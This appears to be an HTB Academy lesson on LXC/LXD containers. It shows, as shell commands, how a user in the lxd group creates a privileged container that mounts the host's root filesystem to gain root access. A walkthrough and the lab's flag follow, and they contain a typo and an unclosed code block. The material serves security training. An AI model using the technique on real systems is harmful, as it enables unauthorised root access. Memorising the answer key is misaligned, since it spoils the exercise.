Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.

## Linux Containers

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.

The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers. The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.

#### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

#### Question

Escalate the privileges and submit the contents of flag.txt as the answer.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run " id " to check if you have lxd privileges
* Check for lxc images, you will find " alpine-v3.18-x86_64-20230607_1234.tar.gz "
* Run Command " lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz ubuntutemp "
* Run Command " xc init ubuntutemp privesc -c security.privileged=true "
* Run Command " lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true "
* Run Command " lxc start privesc "
* Run Command " lxc exec privesc /bin/sh " (dont run bash as Alpine does not run it)
* Move to the folder in " /mnt/root/root " and open the flag file
* HTB{C0nT41n3rs_uhhh}
